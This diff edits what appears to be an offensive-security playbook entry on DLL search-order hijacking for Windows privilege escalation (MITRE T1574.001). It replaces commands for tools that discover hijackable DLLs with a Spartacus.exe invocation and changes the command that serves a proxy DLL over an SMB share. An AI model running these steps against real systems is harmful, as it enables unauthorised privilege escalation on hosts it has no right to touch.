@@ -26,7 +26,7 @@ meta:
 
   mitre:
     tactic: "TA0004 - Privilege Escalation"
-    technique: "T1574.001 - Hijack Execution Flow: DLL Search Order Hijacking"
+    technique: "T1574.001 - Hijack Execution Flow: DLL"
 
   artifacts:
     - "Proxy DLL file replacing legitimate DLL"
@@ -92,9 +92,8 @@ output:
     ```
 
     Or use automated tools:
-    ```bash
-    robber.py --path "C:\Program Files\VulnerableApp"
-    SharpDllProxy.exe --path "C:\Program Files\VulnerableApp"
+    ```powershell
+    Spartacus.exe --mode dll --procmon "C:\Users\User\Downloads\ProcessMonitor\Procmon64.exe" --pml "C:\Users\User\Documents\test\log.log" --csv "C:\Users\User\Documents\test\output.csv" --solution "C:\Users\User\Documents\test" --verbose
     ```
 
     # Prepare Proxy DLL
@@ -117,7 +116,7 @@ output:
 
     **SMB Share:**
     ```bash
-    impacket-smbserver share . -smb2support
+    smbserver.py share . -smb2support
     ```
 
     # Deploy DLL
